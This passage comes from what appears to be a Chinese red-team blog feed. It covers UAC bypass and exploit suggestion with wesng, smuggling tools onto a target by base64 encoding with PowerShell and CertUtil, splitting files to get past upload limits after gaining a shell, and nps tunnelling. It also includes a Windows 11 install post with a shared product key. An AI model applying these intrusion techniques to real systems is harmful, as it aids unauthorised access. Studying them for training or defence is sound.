已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.gitcd wesngpython wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用 wesng 即可</p><pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a></p><p><a href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】13、内网中绕过无法上传文件限制</title>
      <link href="//210701-161347.html"/>
      <url>//210701-161347.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 PowerShell 进行 base64 解码</p><pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CertUtil 进行解码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"> </p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a></p><p><a href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】两种突破内网中无法上传大文件的方法</title>
      <link href="//210630-113201.html"/>
      <url>//210630-113201.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。</p><p>在前段时间就碰到了这个问题，当时在拿下目标 shell 后发现只能上传几百 K 的小文件，文件稍微大些比如几 M 的文件就会提示上传失败，在此简单记录下当时解决的办法。</p><p>针对这种情况，就需要将大文件变成小文件后再进行上传，个人觉着可以简单的分为两种方式，一种是常规的压缩文件一种是分割文件，先来看看第一种方法。</p><h1 id="0x01-压缩文件"><a href="#0x01-压缩文件" class="headerlink" title="0x01 压缩文件"></a>0x01 压缩文件</h1><p>这里以 7-Zip 为代表，其他的压缩软件还有 WinRAR 等，7-Zip 文件下载地址：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p>如果目标主机没有安装 7-Zip，可以现在自己的主机上安装 7-Zip，然后把安装目录下的 7z.exe 拷贝到目标主机上，默认路径为「C:\Program Files\7-Zip\7z.exe」。</p><p>7z.exe 只有 400 多 K 的大小，可以说很是小巧了，以下为 7z.exe 的常用命令。</p><pre class="line-numbers language-none"><code class="language-none">a     添加压缩文件x     解压压缩文件-p    指定密码-v    分卷压缩-r    递归压缩-o    指定输出目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="普通的压缩-解压文件"><a href="#普通的压缩-解压文件" class="headerlink" title="普通的压缩/解压文件"></a>普通的压缩/解压文件</h3><p>把 fscan.exe 压缩成 fscan.7z，压缩密码为『teamssix.com』</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 2794266 bytes (2729 KiB)Extracting archive: fscan.7z--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan.7z 的大小是 2729 KB，fscan.exe 的大小是 2844 KB，可以看到其实大小差别也不大，没能达到我们将大文件变成小文件的目的，这种大小上传可能还是会失败，那再来试试分卷上传。</p><h3 id="分卷压缩-解压文件"><a href="#分卷压缩-解压文件" class="headerlink" title="分卷压缩/解压文件"></a>分卷压缩/解压文件</h3><p>分卷压缩其实和下面介绍的分割文件有点类似，区别还是在于一个对文件进行了压缩，一个没有进行压缩。</p><p>把 fscan.exe 以 500 K 大小进行分卷压缩。</p><pre class="line-numbers language-none"><code class="language-none">7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe a -pteamssix.com -v500k fscan.7z fscan.exe7-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive:1 file, 2911744 bytes (2844 KiB)Creating archive: fscan.7zAdd new data to archive: 1 file, 2911744 bytes (2844 KiB)Files read from disk: 1Archive size: 2794266 bytes (2729 KiB)Everything is Ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 2C2C-615D C:\7-Zip 的目录2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          .2021&#x2F;06&#x2F;29  21:42    &lt;DIR&gt;          ..2021&#x2F;05&#x2F;06  15:00           489,472 7z.exe2021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0012021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0022021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0032021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0042021&#x2F;06&#x2F;29  21:40           512,000 fscan.7z.0052021&#x2F;06&#x2F;29  21:40           234,266 fscan.7z.0062021&#x2F;06&#x2F;18  14:58         2,911,744 fscan.exe               8 个文件      6,195,482 字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把 fscan.7z 解压成 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">7z.exe x -pteamssix.com fscan.7z.001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\7-Zip&gt;7z.exe x -pteamssix.com fscan.7z.0017-Zip 21.02 alpha (x64) : Copyright (c) 1999-2021 Igor Pavlov : 2021-05-06Scanning the drive for archives:1 file, 512000 bytes (500 KiB)Extracting archive: fscan.7z.001--Path &#x3D; fscan.7z.001Type &#x3D; SplitPhysical Size &#x3D; 512000Volumes &#x3D; 6Total Physical Size &#x3D; 2794266----Path &#x3D; fscan.7zSize &#x3D; 2794266--Path &#x3D; fscan.7zType &#x3D; 7zPhysical Size &#x3D; 2794266Headers Size &#x3D; 170Method &#x3D; LZMA2:3m BCJ 7zAESSolid &#x3D; -Blocks &#x3D; 1Everything is OkSize:       2911744Compressed: 2794266<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用分卷压缩可以把一个大文件分成多个小文件，然后将小文件上传上去后，再进行解压就可以了。</p><p>但这样做感觉还是有些麻烦，直接使用下文的 split 进行文件分割个人觉着是更为方便的方法，使用 split 进行分割也是我个人解决前段时间碰到不能上传大文件问题时的方法。</p><h1 id="0x02-分割文件"><a href="#0x02-分割文件" class="headerlink" title="0x02 分割文件"></a>0x02 分割文件</h1><p>使用 split 以 500 K 大小分割 fscan.exe 文件，split 命令在 Linux 和 MAC 下都是自带的，因此在自己的电脑上分割好后，直接上传即可。</p><pre class="line-numbers language-none"><code class="language-none">split -b 500k fscan.exe teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>合并分割文件为 fscan.exe</p><pre class="line-numbers language-none"><code class="language-none">cat teamssix* &gt; fscan# 适用于 Linux、Maccopy &#x2F;b teamssix* fscan.exe# 适用于 Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210629220302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>个人觉着直接用 split 分割文件是较为方便的做法，无需第三方软件，且不论目标是 Linux 还是 Windows 都能支持。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【随笔】Windows 11 的安装尝鲜</title>
      <link href="//210616-133645.html"/>
      <url>//210616-133645.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>看到网上有人发 Windows 11 的安装包，心想，咦，Windows 11 都出来了？那不赶紧下载一个来尝尝鲜。</p><p>网上流传的下载地址：<a href="http://wall4.kfire.net/win11.iso">http://wall4.kfire.net/win11.iso</a></p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>这里以 Mac 下的 VMware Fusion 安装为例，Windows 下的操作也都类似。</p><p>首先打开 <code>VMware Fusion</code>，选择<code>新建</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110553.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>把下载好的 <code>win11.iso</code> 文件拖拽过来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110611.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>拖拽过来后，会来到 <code>创建新的虚拟机</code> 界面，点击继续</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616110707.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来，选择操作系统，我这里选择的 <code>Windows 10 x64</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123525.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>选择固件类型，我这里选择的 <code>传统 BIOS</code>，亲自尝试发现选择 <code>UEFI</code> 会无法启动</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111009.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来，虚拟机就创建完成了，但是默认分配的内存有点低，因此可以点击 <code>自定设置</code>，自己调一下配置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616132656.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击 <code>自定设置</code>后，可以修改个名字，我这里修改成了 <code>windows11</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111717.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击 <code>存储</code> 后，会自动打开设置界面，这里我修改了两个地方，分别是 <code>处理器和内存</code> 和 <code>硬盘（IDE）</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111813.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>打开 <code>处理器和内存</code>，我这里分配了 4 个处理器内核和 4096 MB 的内存</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616111940.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击 <code>显示全部</code>，点击 <code>硬盘（IDE）</code>，我这里分配了 50 G</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112125.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>修改磁盘大小后，点击 <code>应用</code> ,然后关闭设置这个窗口，点击这个大大的启动按钮</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112229.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>启动后，可以看到 Windows 11 新的 logo</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112434.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这个镜像里没有中文，所以就直接用默认的英文了，点击 <code>Next</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112615.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击 <code>Install now</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616112619.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来需要输入激活码，这里有个 Windows 11 Pro 的激活码：</p><pre class="line-numbers language-none"><code class="language-none">FKNPR-6C4GH-R3292-P4RTJ-GVJWB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入激活码，<code>Next</code> 下一步</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123715.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>勾选同意，<code>Next</code> 即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113117.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>选择 <code>Custom</code>，自定义安装</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113230.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><code>New</code> 一个分区，点击 <code>New</code> 后，再点击 <code>Apply</code> 应用一下，不过貌似直接 <code>Next</code> 也可以</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113639.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>点击 <code>Apply</code>后会有个通知，点击确认就行， 然后点击 <code>Next</code> 就开始安装了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616113826.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来，等它安装完成就行了。</p><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>安装完成后，选择国家和地区，这里选择了中国</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616123935.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>选择键盘布局，这里就直接默认了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124044.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>询问是否要再添加一个键盘，这里就直接跳过了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124155.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来，系统会检查更新，检查完成后，输入自己的名字</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>然后输入密码，之后再设置三个安全问题，接受隐私协议，最后等待几分钟</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124739.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>最后，就进入桌面了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616124854.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616125657.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>单纯就外观来看，变化不算小，而且窗口的打开关闭也有了动画过渡，UI 变得更好看了，同时操作逻辑还是原来的逻辑，上手也不会有什么难度，值得一提的是，目前还没遇到什么 bug，这点挺不错的。</p><p>但是再多打开几个窗口，比如说 CMD、计算机管理什么的，还是可以看到很多当年 Win7 的影子，看来 Win11 依然还是一个两种设计语言并存的系统。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616130923.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>从最早的 xp，到 7、8、10 一直到 11 ，不得不说 Windows 确实是变得越来越好看了，现在的 Windows 给我的感觉就是微软有品味了但又不完全有，希望 Windows 继续努力吧，我还是继续用我的 Mac 了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows 11 </tag>
            
            <tag> 尝鲜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】12、nps 的使用</title>
      <link href="//210612-213704.html"/>
      <url>//210612-213704.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p><p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p><p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p><pre class="line-numbers language-none"><code class="language-none">tar -zxvf linux_amd64_server.tar.gz.&#x2F;nps install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><p>启动服务端，默认 Web 管理界面端口 8080 </p><pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609170306.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>nps 的使用也很简单，界面语言也可选择中文。</p><p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p><p><img 